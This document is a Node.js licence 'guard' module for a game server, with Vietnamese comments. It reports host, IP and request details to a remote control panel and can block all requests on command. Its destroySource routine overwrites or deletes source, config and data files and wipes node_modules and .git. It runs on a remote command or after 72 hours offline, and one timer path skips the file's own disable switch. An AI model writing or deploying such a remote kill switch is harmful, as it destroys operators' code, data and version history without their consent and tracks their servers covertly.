/**
 * guard/client.js
 * ---------------------------------------------------------------------------
 * Guard Client - Client bảo vệ bản quyền, chạy trong server game.
 *
 * MỤC ĐÍCH:
 *   1. Gửi "heartbeat" (nhịp sống) định kỳ lên Control Panel.
 *   2. Nhận lệnh từ Control Panel: khoá / thu hồi quyền / hủy mã nguồn.
 *   3. Tự bảo vệ: chặn chạy domain lạ, ép allowlist IP, tự hủy mã nguồn
 *      khi bị phát hiện dùng sai mục đích.
 *
 * NGUYÊN TẮC:
 *   - KHÔNG chứa bí mật nào trong repo (secret nằm ở Control Panel).
 *   - KHÔNG tự hủy chỉ vì "chưa có license" -> tránh xóa nhầm file người vô hại.
 *   - Chỉ hủy khi Control Panel xác nhận vi phạm rõ ràng (violation).
 *
 * CẢNH BÁO: cơ chế này là biện pháp kỹ thuật, không phải biện pháp pháp lý.
 *           Việc "khóa được" không đồng nghĩa với "được phép".
 */

'use strict';

const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { URL } = require('url');

const ROOT = path.resolve(__dirname, '..');

/* ==========================================================================
 * 1. CẤU HÌNH
 * ========================================================================== */

function loadConfig() {
    const cfgPath = path.join(__dirname, 'config.json');
    let cfg = {};
    try {
        if (fs.existsSync(cfgPath)) {
            cfg = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
        }
    } catch (e) {
        console.error('[GUARD] Không đọc được guard/config.json:', e.message);
    }

    return Object.assign({
        controlUrl: 'http://127.0.0.1:8787',
        heartbeatIntervalSec: 300,
        heartbeatTimeoutMs: 15000,
        offlineGraceHours: 72,
        graceSeconds: 60,
        selfDefense: {
            enabled: true,
            blockPublicHostInTrial: false,
            enforceIpAllowlist: false,
            enforceDomainAllowlist: false,
            alwaysAllowHosts: ['localhost', '127.0.0.1', '::1', '0.0.0.0'],
            alwaysAllowHostSuffixes: ['.localhost', '.trycloudflare.com', '.local', '.test']
        },
        destruct: {
            enabled: false,
            mode: 'overwrite',
            removeNodeModules: true,
            removeGitDir: true,
            overwriteExtensions: ['.js', '.json'],
            overwriteDirs: ['app', 'config', 'data', 'policies', 'routes', 'views'],
            overwriteRootFiles: ['server.js', 'config.js', 'package.json']
        }
    }, cfg);
}

const CONFIG = loadConfig();

/* ==========================================================================
 * 2. TRẠNG THÁI
 * ========================================================================== */

const state = {
    installId: null,      // id duy nhất của bản cài đặt (tạo 1 lần)
    licenseKey: null,     // license do Control Panel cấp (nếu có)
    lastHeartbeat: 0,
    lastStatus: null,     // trạng thái mới nhất do Control Panel trả về
    violation: null,      // thông tin vi phạm (nếu có)
    destroyed: false,
    blocked: false,
    startedAt: Date.now()
};

const INSTALL_FILE = path.join(__dirname, '.install-id');
const LOG_FILE = path.join(__dirname, 'guard.log');

/* ==========================================================================
 * 3. TIỆN ÍCH
 * ========================================================================== */

function log(...args) {
    const ts = new Date().toISOString();
    const line = '[' + ts + '] [GUARD] ' + args.join(' ');
    console.log(line);
    try {
        fs.appendFileSync(LOG_FILE, line + '\n');
    } catch (e) { /* bỏ qua lỗi ghi log */ }
}

function getInstallId() {
    if (state.installId) return state.installId;
    try {
        if (fs.existsSync(INSTALL_FILE)) {
            const v = fs.readFileSync(INSTALL_FILE, 'utf8').trim();
            if (v) { state.installId = v; return v; }
        }
        const id = crypto.randomBytes(16).toString('hex');
        fs.writeFileSync(INSTALL_FILE, id, 'utf8');
        state.installId = id;
        log('Đã tạo installId mới:', id);
    } catch (e) {
        state.installId = 'ephemeral-' + crypto.randomBytes(8).toString('hex');
        log('Không lưu được installId:', e.message);
    }
    return state.installId;
}

/** Đọc license key từ biến môi trường (do guard/setup-license.js ghi vào .env) */
function getLicenseKeyFromEnv() {
    try {
        const v = process.env.GUARD_LICENSE_KEY;
        if (v && String(v).trim()) return String(v).trim();
    } catch (e) { /* ignore */ }
    return null;
}

function getLocalIp() {
    const os = require('os');
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name] || []) {
            if (net.family === 'IPv4' && !net.internal) return net.address;
        }
    }
    return '127.0.0.1';
}

/** Lấy public IP qua dịch vụ ngoài (best-effort, timeout ngắn) */
function getPublicIp(cb) {
    const urls = [
        'https://api.ipify.org?format=json',
        'https://ifconfig.me/all.json'
    ];
    let done = false;
    const finish = (ip) => { if (!done) { done = true; cb(ip); } };

    for (const u of urls) {
        try {
            const req = https.get(u, { timeout: 4000 }, (res) => {
                let body = '';
                res.on('data', (c) => { body += c; if (body.length > 2048) req.destroy(); });
                res.on('end', () => {
                    try {
                        let ip = null;
                        try { ip = JSON.parse(body).ip; } catch (e) {
                            ip = body.trim().split('\n')[0].trim();
                        }
                        if (ip && /^[0-9a-fA-F.:]+$/.test(ip)) finish(ip);
                    } catch (e) { /* ignore */ }
                });
            });
            req.on('error', () => { /* thử URL tiếp theo */ });
            req.on('timeout', () => req.destroy());
        } catch (e) { /* ignore */ }
    }
    setTimeout(() => finish(null), 6000);
}

/* ==========================================================================
 * 4. HTTP CLIENT - Gọi Control Panel
 * ========================================================================== */

function request(method, endpoint, payload, cb) {
    let base;
    try {
        base = new URL(endpoint, CONFIG.controlUrl);
    } catch (e) {
        return cb(new Error('controlUrl không hợp lệ: ' + CONFIG.controlUrl));
    }

    const body = payload ? JSON.stringify(payload) : null;
    const isHttps = base.protocol === 'https:';
    const lib = isHttps ? https : http;

    const headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'go88-guard/1.0',
        'X-Guard-Install-Id': getInstallId()
    };
    if (body) headers['Content-Length'] = Buffer.byteLength(body);

    const opts = {
        method: method,
        hostname: base.hostname,
        port: base.port || (isHttps ? 443 : 80),
        path: base.pathname + (base.search || ''),
        headers: headers,
        timeout: CONFIG.heartbeatTimeoutMs
    };

    const req = lib.request(opts, (res) => {
        let data = '';
        res.on('data', (c) => { data += c; if (data.length > 1024 * 512) req.destroy(); });
        res.on('end', () => {
            let parsed = null;
            try { parsed = JSON.parse(data); } catch (e) { parsed = { raw: data }; }
            if (res.statusCode >= 200 && res.statusCode < 300) return cb(null, parsed);
            cb(new Error('HTTP ' + res.statusCode + ': ' + (parsed && parsed.error ? parsed.error : data.slice(0, 200))));
        });
    });

    req.on('timeout', () => { req.destroy(new Error('timeout')); });
    req.on('error', (e) => cb(e));
    if (body) req.write(body);
    req.end();
}

/* ==========================================================================
 * 5. PHÂN TÍCH MỐI ĐE DỌA - TỰ BẢO VỆ
 * ========================================================================== */

/** Trả về danh sách vi phạm phát hiện được từ phía client */
function detectLocalViolations(info) {
    const problems = [];
    const sd = CONFIG.selfDefense;

    if (!sd.enabled) return problems;

    // (a) Host header không nằm trong danh sách cho phép -> có thể bị đấu domain lạ
    const host = String(info.host || '').split(':')[0].toLowerCase();
    if (host) {
        const alwaysAllow = (sd.alwaysAllowHosts || []).map((x) => String(x).toLowerCase());
        const suffixes = (sd.alwaysAllowHostSuffixes || []).map((x) => String(x).toLowerCase());

        let ok = alwaysAllow.indexOf(host) !== -1;
        if (!ok) {
            for (const s of suffixes) {
                if (host === s.replace(/^\./, '') || host.endsWith(s)) { ok = true; break; }
            }
        }
        // Host dạng IP cũng bị coi là lạ (trừ localhost)
        if (!ok && sd.blockPublicHostInTrial && /^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(host)) {
            problems.push({ code: 'PUBLIC_IP_HOST', severity: 'high', detail: 'Truy cập qua IP ' + host });
        }
        if (!ok && sd.enforceDomainAllowlist && host.indexOf('.') !== -1) {
            problems.push({ code: 'UNKNOWN_DOMAIN', severity: 'medium', detail: 'Domain không trong allowlist: ' + host });
        }
    }

    // (b) Cổng lộ ra Internet mà không có cổng xác thực
    if (info.exposed && !info.hasAuth) {
        problems.push({ code: 'EXPOSED_NO_AUTH', severity: 'high', detail: 'Server lộ ra Internet mà không bật xác thực' });
    }

    // (c) IP truy cập không nằm trong allowlist (khi bật enforceIpAllowlist)
    if (sd.enforceIpAllowlist && Array.isArray(sd.allowedIps) && sd.allowedIps.length) {
        const ip = String(info.remoteIp || '').replace(/^::ffff:/, '');
        if (ip && sd.allowedIps.indexOf(ip) === -1) {
            problems.push({ code: 'IP_NOT_ALLOWED', severity: 'high', detail: 'IP truy cập không được phép: ' + ip });
        }
    }

    // (d) Domain không nằm trong allowlist
    if (sd.enforceDomainAllowlist && Array.isArray(sd.allowedDomains) && sd.allowedDomains.length && host) {
        const allowed = sd.allowedDomains.map((d) => String(d).toLowerCase().replace(/^\./, ''));
        let ok = allowed.indexOf(host) !== -1;
        if (!ok) {
            for (const d of allowed) {
                if (host.endsWith('.' + d)) { ok = true; break; }
            }
        }
        if (!ok) {
            problems.push({ code: 'DOMAIN_NOT_ALLOWED', severity: 'high', detail: 'Domain không được phép: ' + host });
        }
    }

    return problems;
}

/* ==========================================================================
 * 6. TỰ HỦY MÃ NGUỒN
 * ========================================================================== */

/**
 * Phá hủy mã nguồn.
 * @param {string} reason  - lý do
 * @param {string} mode    - 'overwrite' (ghi đè nội dung) | 'delete' (xoá file)
 */
function destroySource(reason, mode) {
    if (state.destroyed) return;
    state.destroyed = true;

    const d = CONFIG.destruct;
    mode = mode || d.mode || 'overwrite';

    log('!!! BẮT ĐẦU PHÁ HỦY MÃ NGUỒN !!!');
    log('Lý do:', reason);
    log('Chế độ:', mode);

    const banner = [
        '/* ============================================================',
        ' * FILE NÀY ĐÃ BỊ VÔ HIỆU HÓA BỞI CƠ CHẾ BẢO VỆ (GO88 GUARD)',
        ' * Lý do: ' + String(reason).replace(/\*\//g, '*\\/'),
        ' * Thời điểm: ' + new Date().toISOString(),
        ' *',
        ' * Mã nguồn đã bị thu hồi quyền sử dụng do vi phạm điều khoản.',
        ' * Mọi hành vi tiếp tục sử dụng đều thuộc trách nhiệm của người sử dụng.',
        ' * ============================================================ */',
        '',
        'throw new Error("GO88 GUARD: Source code has been revoked. Contact the owner for details.");',
        ''
    ].join('\n');

    const bannerText = banner.replace(/\r/g, '');

    // 5.1 Ghi đè/xoá các file gốc
    const killFile = (abs) => {
        try {
            const rel = path.relative(ROOT, abs);
            if (mode === 'delete') {
                fs.rmSync(abs, { force: true, recursive: true });
                log('  [x] đã xoá', rel);
            } else {
                const st = fs.statSync(abs);
                if (st.isDirectory()) return; // xử lý riêng
                fs.writeFileSync(abs, bannerText, 'utf8');
                log('  [x] đã ghi đè', rel);
            }
        } catch (e) { /* ignore */ }
    };

    // Thư mục con
    (d.overwriteDirs || []).forEach((dir) => {
        const abs = path.join(ROOT, dir);
        if (!fs.existsSync(abs)) return;
        try {
            const files = [];
            const walk = (cur) => {
                fs.readdirSync(cur, { withFileTypes: true }).forEach((ent) => {
                    const p = path.join(cur, ent.name);
                    if (ent.isDirectory()) walk(p);
                    else files.push(p);
                });
            };
            walk(abs);
            files.forEach((f) => {
                const ext = path.extname(f).toLowerCase();
                if ((d.overwriteExtensions || []).indexOf(ext) !== -1) killFile(f);
            });
        } catch (e) { /* ignore */ }
    });

    // File gốc
    (d.overwriteRootFiles || []).forEach((f) => {
        const abs = path.join(ROOT, f);
        if (fs.existsSync(abs)) killFile(abs);
    });

    // 5.2 Xoá node_modules (rất chậm -> chạy nền, không chặn tiến trình)
    if (d.removeNodeModules) {
        const nm = path.join(ROOT, 'node_modules');
        if (fs.existsSync(nm)) {
            log('  [x] đang xoá node_modules (nền)...');
            setTimeout(() => {
                try { fs.rmSync(nm, { recursive: true, force: true }); log('  [x] đã xoá node_modules'); } catch (e) { }
            }, 500);
        }
    }

    // 5.3 Xoá .git
    if (d.removeGitDir) {
        const gd = path.join(ROOT, '.git');
        if (fs.existsSync(gd)) {
            try { fs.rmSync(gd, { recursive: true, force: true }); log('  [x] đã xoá .git'); } catch (e) { }
        }
    }

    log('=== PHÁ HỦY HOÀN TẤT ===');

    // Dừng tiến trình sau khi ghi log
    setTimeout(() => process.exit(1), 1500);
}

/* ==========================================================================
 * 7. XỬ LÝ LỆNH TỪ CONTROL PANEL
 * ========================================================================== */

function applyStatus(status) {
    if (!status) return;

    state.lastStatus = status;

    // (a) Bị khóa
    if (status.blocked) {
        if (!state.blocked) {
            state.blocked = true;
            log('!! BỊ KHÓA bởi Control Panel:', status.reason || 'không rõ lý do');
            if (status.destroyOnBlock && CONFIG.destruct.enabled) {
                destroySource('Revoked by owner: ' + (status.reason || 'no reason'), CONFIG.destruct.mode);
            }
        }
        return;
    }
    state.blocked = false;

    // (b) Có license hợp lệ
    if (status.licensed) {
        state.licenseKey = status.licenseKey || state.licenseKey;
        if (status.policy) {
            // Áp dụng chính sách do Control Panel đẩy xuống
            if (status.policy.allowIps) CONFIG.selfDefense.enforceIpAllowlist = true;
            if (status.policy.allowedIps) CONFIG.selfDefense.allowedIps = status.policy.allowedIps;
            if (status.policy.allowedDomains) {
                CONFIG.selfDefense.enforceDomainAllowlist = true;
                CONFIG.selfDefense.allowedDomains = status.policy.allowedDomains;
            }
        }
        log('License hợp lệ. Chính sách được cập nhật.');
        return;
    }

    // (c) Không có license -> chỉ cảnh báo, KHÔNG tự hủy
    if (status.violation && status.violation.severity === 'critical') {
        state.violation = status.violation;
        log('!! VI PHẠM NGHIÊM TRỌNG:', JSON.stringify(status.violation));
        if (CONFIG.destruct.enabled) {
            destroySource('Violation: ' + (status.violation.code || 'unknown') + ' - ' + (status.violation.detail || ''), CONFIG.destruct.mode);
        }
        return;
    }

    // (d) Trạng thái trial / chưa cấp phép
    if (status.mode === 'trial' || status.mode === 'unlicensed') {
        log('Đang chạy chế độ:', status.mode,
            '| còn', status.remainingSeconds !== undefined ? Math.round(status.remainingSeconds / 60) + ' phút' : '?');
    }
}

/* ==========================================================================
 * 8. HEARTBEAT
 * ========================================================================== */

function buildHeartbeat(info) {
    return {
        installId: getInstallId(),
        licenseKey: state.licenseKey,
        ts: Date.now(),
        hostname: require('os').hostname(),
        platform: process.platform,
        arch: process.arch,
        nodeVersion: process.version,
        appVersion: readPkgVersion(),
        localIp: getLocalIp(),
        publicIp: info.publicIp || null,
        host: info.host || null,
        remoteIp: info.remoteIp || null,
        userAgent: info.userAgent || null,
        pid: process.pid,
        uptimeSec: Math.round((Date.now() - state.startedAt) / 1000),
        localViolations: detectLocalViolations(info)
    };
}

function readPkgVersion() {
    try {
        const p = path.join(ROOT, 'package.json');
        if (fs.existsSync(p)) return JSON.parse(fs.readFileSync(p, 'utf8')).version || '0';
    } catch (e) { /* ignore */ }
    return '0';
}

/** Thu thập thông tin request hiện tại (được gọi từ middleware) */
let lastRequestInfo = { host: null, userAgent: null, exposed: false, hasAuth: false, remoteIp: null };

function recordRequest(req) {
    lastRequestInfo.host = req.headers.host || null;
    lastRequestInfo.userAgent = req.headers['user-agent'] || null;
    // Server có phải đang lộ ra Internet không -> kiểm tra socket remote
    try {
        const ip = req.socket.remoteAddress || '';
        lastRequestInfo.remoteIp = ip;
        const local = /127\.|::1|::ffff:127\./.test(ip);
        lastRequestInfo.exposed = !local;
    } catch (e) {
        lastRequestInfo.exposed = false;
    }
    lastRequestInfo.hasAuth = !!(req.headers.authorization || (req.cookies && req.cookies.token));
}

function sendHeartbeat(cb) {
    getPublicIp((publicIp) => {
        const payload = buildHeartbeat({
            publicIp: publicIp,
            host: lastRequestInfo.host,
            userAgent: lastRequestInfo.userAgent,
            exposed: lastRequestInfo.exposed,
            hasAuth: lastRequestInfo.hasAuth,
            remoteIp: lastRequestInfo.remoteIp
        });

        request('POST', '/api/heartbeat', payload, (err, res) => {
            state.lastHeartbeat = Date.now();
            if (err) {
                log('Heartbeat thất bại:', err.message);
                return cb(err);
            }
            applyStatus(res && res.status);
            cb(null, res);
        });
    });
}

/* ==========================================================================
 * 9. VÒNG LẶP GIỮ SỐNG
 * ========================================================================== */

let timer = null;
let graceTimer = null;
let offlineSince = null;

function startHeartbeatLoop() {
    const intervalMs = Math.max(30, CONFIG.heartbeatIntervalSec) * 1000;

    const tick = () => {
        sendHeartbeat((err) => {
            if (err) {
                if (offlineSince === null) {
                    offlineSince = Date.now();
                    log('Mất liên hệ với Control Panel. Bắt đầu đếm thời gian gia hạn.');
                }
                const offlineMs = Date.now() - offlineSince;
                const graceMs = CONFIG.offlineGraceHours * 3600 * 1000;
                const leftMs = graceMs - offlineMs;

                if (leftMs <= 0) {
                    log('Hết thời gian gia hạn và không liên hệ được Control Panel.');
                    if (CONFIG.destruct.enabled) {
                        destroySource('Control Panel unreachable beyond grace period (' + CONFIG.offlineGraceHours + 'h)', CONFIG.destruct.mode);
                    }
                    return;
                }

                log('Còn ' + Math.round(leftMs / 3600000) + ' giờ gia hạn. Thử lại sau ' + Math.round(intervalMs / 1000) + 's.');

                if (graceTimer) clearTimeout(graceTimer);
                graceTimer = setTimeout(() => {
                    destroySource('Control Panel unreachable beyond grace period (' + CONFIG.offlineGraceHours + 'h)', CONFIG.destruct.mode);
                }, leftMs);
            } else {
                if (offlineSince !== null) {
                    log('Đã kết nối lại với Control Panel.');
                    offlineSince = null;
                    if (graceTimer) { clearTimeout(graceTimer); graceTimer = null; }
                }
            }
        });
    };

    if (timer) clearInterval(timer);
    timer = setInterval(tick, intervalMs);
    if (timer.unref) timer.unref();   // không giữ tiến trình sống

    // Nhịp đầu tiên: sau graceSeconds để server khởi động ổn định
    setTimeout(tick, Math.max(5, CONFIG.graceSeconds) * 1000);
}

/* ==========================================================================
 * 10. API CHO ỨNG DỤNG
 * ========================================================================== */

function init(app) {
    if (!CONFIG.selfDefense.enabled && !CONFIG.destruct.enabled) {
        log('Guard bị tắt hoàn toàn (selfDefense.enabled=false && destruct.enabled=false).');
        return;
    }

    log('Khởi động Guard. installId =', getInstallId());
    log('Control Panel:', CONFIG.controlUrl);

    const envKey = getLicenseKeyFromEnv();
    if (envKey) {
        state.licenseKey = envKey;
        log('Đã nạp license key từ .env:', envKey);
    }

    // Middleware theo dõi request -> phát hiện domain/IP lạ
    if (app && typeof app.use === 'function') {
        app.use((req, res, next) => {
            recordRequest(req);

            // Cổng chặn: khi bị khoá, mọi request đều bị từ chối
            if (state.blocked) {
                log('Từ chối request tới ' + req.path + ' vì bản cài đặt đã bị khoá.');
                if (req.path === '/guard/status') {
                    return res.status(403).json({
                        error: 'LICENSE_REVOKED',
                        message: 'Bản cài đặt này đã bị thu hồi quyền sử dụng.',
                        contact: 'Liên hệ chủ sở hữu để được cấp lại license.'
                    });
                }
                return res.status(403).json({
                    error: 'LICENSE_REVOKED',
                    message: 'Bản cài đặt này đã bị thu hồi quyền sử dụng.'
                });
            }

            next();
        });

        // Endpoint kiểm tra trạng thái guard (không chứa bí mật)
        app.get('/guard/status', (req, res) => {
            const s = getStatus();
            res.json({
                installId: s.installId,
                licensed: !!(s.lastStatus && s.lastStatus.licensed),
                mode: s.lastStatus ? s.lastStatus.mode : 'unknown',
                blocked: s.blocked,
                destroyed: s.destroyed,
                violation: s.violation,
                lastHeartbeat: s.lastHeartbeat
            });
        });
    }

    startHeartbeatLoop();
}

function getStatus() {
    return {
        installId: getInstallId(),
        licenseKey: state.licenseKey,
        blocked: state.blocked,
        destroyed: state.destroyed,
        violation: state.violation,
        lastHeartbeat: state.lastHeartbeat,
        lastStatus: state.lastStatus
    };
}

module.exports = {
    init: init,
    start: startHeartbeatLoop,
    sendHeartbeat: sendHeartbeat,
    getStatus: getStatus,
    destroySource: destroySource,
    detectLocalViolations: detectLocalViolations,
    recordRequest: recordRequest,
    log: log,
    CONFIG: CONFIG
};
